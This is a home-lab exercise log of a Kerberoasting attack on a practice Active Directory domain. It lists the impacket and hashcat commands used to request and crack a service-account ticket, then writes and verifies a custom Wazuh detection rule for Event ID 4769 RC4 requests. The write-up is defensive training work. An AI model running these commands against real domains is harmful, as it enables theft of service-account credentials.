# Attack Lab 02 — Kerberoasting
**Date:** April 18, 2026
**Attacker:** Kali Linux VM
**Target:** aperture.science Active Directory — svc-backup service account
**Outcome:** TGS ticket obtained, password cracked offline, T1558.003 custom detection rule written and verified

---

## Overview

Kerberoasting is one of the most common Active Directory attacks in real-world engagements. It requires only a standard domain user account — no elevated privileges — and produces a crackable hash entirely through legitimate Kerberos protocol behavior. The attack is stealthy because requesting a TGS ticket is normal Windows activity.

The goal of this exercise was to:
1. Execute the full Kerberoasting attack chain from a low-privilege foothold
2. Observe what Wazuh caught out of the box
3. Identify the detection gap (T1558.003 not mapped by default)
4. Write a custom rule to close that gap

---

## Environment

```
Kali Linux VM     (attacker)
DC01              10.0.10.21    (Domain Controller — aperture.science)
CHELL             (domain workstation)
GLaDOS            10.0.10.10    (Wazuh Manager, custom rules)
```

---

## Phase 1 — Setup

### Install Impacket on Kali

```bash
sudo apt update
sudo apt install python3-impacket -y
```

### Fix Clock Skew

Kerberos requires clocks to be within 5 minutes of each other. Two fixes were needed:

**On Kali — install and sync chrony:**
```bash
sudo apt install chrony -y
sudo systemctl start chrony
sudo chronyc makestep
```

Add DC01 as NTP source in `/etc/chrony/chrony.conf`:
```
server 10.0.10.21 iburst prefer
```

```bash
sudo systemctl restart chrony
sudo chronyc makestep
```

**On DC01 — start Windows Time service and sync:**
```powershell
Start-Service "Windows Time"
w32tm /config /manualpeerlist:"pool.ntp.org" /syncfromflags:manual /reliable:YES /update
w32tm /resync /force
```

> **Note:** If DC01 shows the wrong timezone, set it first:
> ```powershell
> Set-TimeZone -Id "Eastern Standard Time"
> ```

> **Note:** `Restart-Service w32tm` will fail — use `Stop-Service`/`Start-Service` or `Start-Service "Windows Time"` instead.

---

## Phase 2 — Kerberoasting

Request a TGS ticket for the `svc-backup` service account using low-privilege credentials:

```bash
impacket-GetUserSPNs aperture.science/doug.rattmann -dc-ip 10.0.10.21 -request
```

Enter doug.rattmann's password when prompted.

**Result:** A `$krb5tgs$23$` hash returned for `svc-backup`. The `23` indicates RC4-HMAC encryption — the weaker, crackable variant.

> **Why this works:** Any domain user can request a TGS ticket for any account with an SPN registered. DC01 hands it over without question. The ticket is encrypted with the service account's password hash — which can now be cracked offline.

Save the hash:
```bash
nano hash.txt
# paste the full $krb5tgs$23$... block
```

---

## Phase 3 — Offline Cracking

**First attempt — straight dictionary attack:**
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
Result: Exhausted — password was too complex for a plain dictionary attack.

**Second attempt — rule-based attack:**
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
Result: **Password cracked.**

Check cracked result:
```bash
hashcat -m 13100 hash.txt --show
```

> **Key lesson:** Kerberoasting success depends entirely on password strength. A strong service account password survives cracking. A weak one does not. This is why service account password policies matter in real environments.

---

## Phase 4 — Detection (Out of the Box)

After running impacket and cracking the password, Wazuh produced the following alerts with no custom rules:

| Action | Detected As | MITRE ID | Detected |
|---|---|---|---|
| doug.rattmann domain logon | Valid Accounts | T1078 | ✓ |
| impacket TGS ticket request | Pass the Hash | T1550.002 | ✓ |
| svc-backup credential reuse after crack | Pass the Hash | T1550.002 | ✓ |
| Kerberoasting TGS request specifically | — | T1558.003 | ✗ |

Wazuh caught the attack but mapped the TGS request to T1550.002 (Pass the Hash) rather than T1558.003 (Kerberoasting). The attack was detected — but not precisely identified.

---

## Phase 5 — Custom Detection Rule

### Step 1 — Enable Kerberos Auditing on DC01

```powershell
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

This enables **Event ID 4769** (Kerberos service ticket request) in the Windows Security log.

### Step 2 — Write Custom Wazuh Rule on GLaDOS

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

```xml
<group name="windows,kerberoasting,">
  <rule id="100001" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <field name="win.eventdata.serviceName" negate="yes">^.*\$$</field>
    <description>Possible Kerberoasting - RC4 encrypted TGS ticket requested</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

**What this rule does:**
- Triggers on Event ID 4769 — Kerberos TGS ticket request
- Filters for RC4-HMAC encryption type `0x17` — the weaker encryption attackers request because it's crackable
- Excludes computer accounts (names ending in `$`) to reduce false positives
- Maps directly to T1558.003 — Kerberoasting

```bash
sudo systemctl restart wazuh-manager
```

### Step 3 — Verify

Reran impacket on Kali — **T1558.003 fired in Wazuh under Credential Access.**

---

## Final Detection Picture

| Action | Detected As | MITRE ID | Detected |
|---|---|---|---|
| doug.rattmann domain logon | Valid Accounts | T1078 | ✓ |
| impacket TGS ticket request | Kerberoasting | T1558.003 | ✓ |
| svc-backup credential reuse | Pass the Hash | T1550.002 | ✓ |

All three stages of the attack chain are now detected and correctly mapped.

---

## Key Takeaways

- **Kerberoasting requires zero elevated privileges** — any domain user can pull a TGS ticket for any SPN-registered account
- **The attack is entirely offline after the ticket is obtained** — no further DC interaction needed, nothing to detect during cracking
- **Wazuh default rules caught the attack but mislabeled it** — T1550.002 fired instead of T1558.003; still actionable but imprecise
- **Custom rules are essential for precise MITRE mapping** — Event ID 4769 + RC4 encryption type is the definitive Kerberoasting signature
- **Password strength is the primary defense** — strong service account passwords survive offline cracking; weak ones don't
- **Clock sync is critical for Kerberos** — impacket will fail with `KRB_AP_ERR_SKEW` if clocks are more than 5 minutes apart

---

*Attack exercise completed: April 18, 2026*
